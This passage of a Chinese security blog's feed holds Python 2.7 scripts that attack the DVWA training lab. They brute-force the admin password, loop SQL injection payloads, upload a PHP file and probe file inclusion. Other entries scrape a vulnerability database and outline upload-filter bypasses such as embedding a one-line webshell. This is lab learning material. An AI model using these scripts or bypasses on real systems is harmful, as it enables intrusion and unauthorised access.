<span class="comment">#保存在csv文件中</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"seebug.csv"</span>,<span class="string">"w"</span>,newline=<span class="string">""</span>) <span class="keyword">as</span> f:</span><br><span class="line">        writer=csv.writer(f,dialect=(<span class="string">"excel"</span>))</span><br><span class="line">        writer.writerow([<span class="string">"标题"</span>,<span class="string">"时间"</span>,<span class="string">"编号"</span>,<span class="string">"危害级别"</span>,<span class="string">"漏洞描述"</span>])</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> articles:</span><br><span class="line">            writer.writerow(row)</span><br><span class="line"></span><br><span class="line">articles=[]</span><br><span class="line">url=<span class="string">"https://www.seebug.org/vuldb/ssvid-"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97210</span>,<span class="number">97213</span>):</span><br><span class="line">    url_data=url+str(i)</span><br><span class="line">    doSth(url_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#def main(h=1,m=0):  </span></span><br><span class="line"> <span class="comment">#   while True:  </span></span><br><span class="line">  <span class="comment">#      now = datetime.datetime.now()  </span></span><br><span class="line">        <span class="comment"># print(now.hour, now.minute)  </span></span><br><span class="line">   <span class="comment">#     if now.hour == h and now.minute == m:  </span></span><br><span class="line">    <span class="comment">#        break  </span></span><br><span class="line">        <span class="comment"># 每隔60秒检测一次   </span></span><br><span class="line">     <span class="comment">#   time.sleep(60)  </span></span><br><span class="line">   <span class="comment"># doSth()#爬虫程序</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;最近几天在用python写一个简单的爬虫，主要是来爬取一些实时的漏洞库。&quot;&gt;&lt;a href=&quot;#最近几天在用python写一个简单的爬虫，主要是来爬取一些实时的漏洞库。&quot; class=&quot;headerlink&quot; title=&quot;最近几天在用python写一个简单的爬虫
      
    
    </summary>
    
    
      <category term="代码" scheme="elssm.github.io/tags/%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>针对DVWA下的python脚本</title>
    <link href="elssm.github.io/2018/03/20/%E9%92%88%E5%AF%B9DVWA%E4%B8%8B%E7%9A%84python%E8%84%9A%E6%9C%AC/"/>
    <id>elssm.github.io/2018/03/20/针对DVWA下的python脚本/</id>
    <published>2018-03-20T05:39:14.000Z</published>
    <updated>2018-03-20T05:54:46.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="首先是dvwa的搭建过程，这里我采用的是集成环境phpstudy进行本地搭建。利用下列脚本时需将dvwa的config-ini-php文件中的security改为low或者手动抓取low等级下的cookie。python版本为2-7"><a href="#首先是dvwa的搭建过程，这里我采用的是集成环境phpstudy进行本地搭建。利用下列脚本时需将dvwa的config-ini-php文件中的security改为low或者手动抓取low等级下的cookie。python版本为2-7" class="headerlink" title="首先是dvwa的搭建过程，这里我采用的是集成环境phpstudy进行本地搭建。利用下列脚本时需将dvwa的config.ini.php文件中的security改为low或者手动抓取low等级下的cookie。python版本为2.7"></a>首先是dvwa的搭建过程，这里我采用的是集成环境phpstudy进行本地搭建。利用下列脚本时需将dvwa的config.ini.php文件中的security改为low或者手动抓取low等级下的cookie。python版本为2.7</h5><ul><li><p>暴力破解 安全系数：low</p><p>IP为本地IP，txt文件在相同目录下，可自行修改。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httplib2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv) - <span class="number">1</span></span><br><span class="line">argv = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">-1</span> <span class="keyword">or</span> argc &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"用法：python"</span>,sys.argv[<span class="number">0</span>],<span class="string">"IP地址 端口号"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"192.168.109.147"</span></span><br><span class="line">port = <span class="string">"80"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argc &gt;= <span class="number">1</span>:</span><br><span class="line">    ip = argv[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">    port = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">h=httplib2.Http( )</span><br><span class="line">url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/vulnerabilities/brute/"</span></span><br><span class="line">response,content=h.request(url)</span><br><span class="line">cookie=response[<span class="string">"Set-Cookie"</span>]</span><br><span class="line">header=&#123;<span class="string">"cookie"</span>:cookie&#125;</span><br><span class="line">filepasswords=open(<span class="string">"dict.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">passwords=filepasswords.readlines()</span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    tmp=url+<span class="string">"?username=admin"</span>+<span class="string">"&amp;password="</span>+password[:<span class="number">-1</span>]+<span class="string">"&amp;Login=Login"</span></span><br><span class="line">    res,content=h.request(tmp,<span class="string">"GET"</span>,<span class="string">""</span>,header)</span><br><span class="line">    <span class="keyword">print</span> res[<span class="string">"content-length"</span>]+<span class="string">":"</span>+<span class="string">"admin"</span>+<span class="string">":"</span>+password[:<span class="number">-1</span>]+<span class="string">"\n"</span></span><br></pre></td></tr></table></figure><ul><li><p>sql注入 安全系数：low</p><p>IP为本地IP，txt文件在相同目录下，可自行修改。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httplib2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv) - <span class="number">1</span></span><br><span class="line">argv = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">-1</span> <span class="keyword">or</span> argc &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"用法：python"</span>,sys.argv[<span class="number">0</span>],<span class="string">"IP地址 端口号"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"192.168.109.147"</span></span><br><span class="line">port = <span class="string">"80"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argc &gt;= <span class="number">1</span>:</span><br><span class="line">    ip = argv[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">    port = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">h=httplib2.Http()</span><br><span class="line">file=open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">tests=file.readlines()</span><br><span class="line">url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/vulnerabilities/sqli/"</span></span><br><span class="line">response,content=h.request(url)</span><br><span class="line">cookie=response[<span class="string">"Set-Cookie"</span>]</span><br><span class="line">header=&#123;<span class="string">"cookie"</span>:cookie&#125;</span><br><span class="line"><span class="keyword">for</span> test <span class="keyword">in</span> tests:</span><br><span class="line">    m=urllib.quote(test)</span><br><span class="line">    n=m.replace(<span class="string">'%20'</span>,<span class="string">'+'</span>)</span><br><span class="line">    tmp=url+<span class="string">"?id="</span>+n[:<span class="number">-1</span>]+<span class="string">"&amp;Submit=Submit"</span></span><br><span class="line">    res,content=h.request(tmp,<span class="string">"GET"</span>,<span class="string">""</span>,header)</span><br><span class="line">    result=re.findall(<span class="string">r'&lt;pre&gt;(.*?)&lt;/pre&gt;'</span>,content)</span><br><span class="line">    <span class="keyword">print</span> result</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\n'</span></span><br></pre></td></tr></table></figure><ul><li><p>文件上传 安全系数：low</p><p>IP为本地IP,该脚本上传文件目录在D盘下，可自行修改。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv) - <span class="number">1</span></span><br><span class="line">argv = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">-1</span> <span class="keyword">or</span> argc &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"用法：python"</span>,sys.argv[<span class="number">0</span>],<span class="string">"IP地址 端口号"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"</span>- </span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"192.168.109.147"</span></span><br><span class="line">port = <span class="string">"80"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argc &gt;= <span class="number">1</span>:</span><br><span class="line">    ip = argv[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">    port = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/vulnerabilities/upload/"</span></span><br><span class="line">data=<span class="literal">None</span></span><br><span class="line">files=&#123;<span class="string">'file'</span>:open(<span class="string">r'D:\php.php'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line">h=requests.post(url=url,data=data,files=files)</span><br><span class="line">code=requests.get(<span class="string">"http://"</span>+ip+<span class="string">"/hackable/uploads/php.php"</span>).status_code</span><br><span class="line"><span class="keyword">if</span> code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"文件上传成功"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"文件上传失败"</span></span><br></pre></td></tr></table></figure><ul><li><p>文件包含 安全系数：low</p><p>IP为本地IP,txt文件在相同目录下，可自行修改。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv) - <span class="number">1</span></span><br><span class="line">argv = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">-1</span> <span class="keyword">or</span> argc &gt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"用法：python"</span>,sys.argv[<span class="number">0</span>],<span class="string">"IP地址 端口号"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"例如：url为http://127.0.0.1:8080/，则IP地址应为127.0.0.1，端口号应为8080"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"192.168.109.147"</span></span><br><span class="line">port = <span class="string">"80"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argc &gt;= <span class="number">1</span>:</span><br><span class="line">    ip = argv[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">    port = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">'include.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">includes=file.readlines()</span><br><span class="line">url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/vulnerabilities/fi/?page"</span></span><br><span class="line"><span class="keyword">for</span> include <span class="keyword">in</span> includes:</span><br><span class="line">    tmp=url+<span class="string">"?page="</span>+include[:<span class="number">-1</span>]</span><br><span class="line">    res=requests.get(tmp)</span><br><span class="line">    <span class="keyword">if</span>(res.status_code==<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"exploit can be used"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"exploit can't be used"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;首先是dvwa的搭建过程，这里我采用的是集成环境phpstudy进行本地搭建。利用下列脚本时需将dvwa的config-ini-php文件中的security改为low或者手动抓取low等级下的cookie。python版本为2-7&quot;&gt;&lt;a href=&quot;#首先是d
      
    
    </summary>
    
    
      <category term="代码" scheme="elssm.github.io/tags/%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>对上传漏洞攻击框架的一些简单总结</title>
    <link href="elssm.github.io/2018/03/19/%E5%AF%B9%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <id>elssm.github.io/2018/03/19/对上传漏洞攻击框架的一些简单总结/</id>
    <published>2018-03-19T00:13:07.000Z</published>
    <updated>2018-03-19T13:22:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>在常见的表单页面和修改信息页面我们经常会看到上传文件的身影，这样的话不乏存在一些漏洞，而当出现了这类漏洞，我们应该如何去利用，我做了如下的分类。</p><ul><li><p>客户端检测绕过：利用burpsuite修改文件扩展名，然后进行upload</p></li><li><p>服务端检测绕过</p><ul><li>（MIME类型）：修改request包的Content-Type进行绕过。 MIME：MIME意为 多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮  件时附加多媒  体数据，让邮件客户程序能根据其类型进行处理.</li><li>(文件内容检测)：利用winhex在文件幻数后面添加一句话木马代码。</li><li>（文件相关信息检测）：伪造文件头部信息。</li><li>（文件加载检测）这里分为两种，一次渲染和二次渲染。针对一次渲染我们可以   在空白区进行代码注入。二次渲染的话可以对文件加载器进行攻击。</li></ul></li><li><p>服务器检测绕过：利用0x00进行截断绕过。</p></li><li><p>解析漏洞</p><ul><li><p>解析漏洞较为广泛，常见的例如php文件解析漏洞，服务器解析漏洞等等，在这里推荐两个网址有兴趣可以去看看</p><p><a href="http://www.freebuf.com/vuls/112339.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/112339.html</a></p><p><a href="http://blog.csdn.net/wizardforcel/article/details/50695896" target="_blank" rel="noopener">http://blog.csdn.net/wizardforcel/article/details/50695896</a></p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在常见的表单页面和修改信息页面我们经常会看到上传文件的身影，这样的话不乏存在一些漏洞，而当出现了这类漏洞，我们应该如何去利用，我做了如下的分类。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;客户端检测绕过：利用burpsuite修改文件扩展名，然后进行upload&lt;/p&gt;
&lt;/li&gt;

      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="elssm.github.io/2018/03/14/test/"/>
    <id>elssm.github.io/2018/03/14/test/</id>
    <published>2018-03-14T13:48:51.000Z</published>
    <updated>2018-03-19T13:23:10.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"https://www.baidu.com"</span></span><br><span class="line">res=requests.get(url)</span><br><span class="line"><span class="keyword">print</span> res.headers</span><br></pre></td></tr></table></figure><p>​</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="代码" scheme="elssm.github.io/tags/%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
</feed>
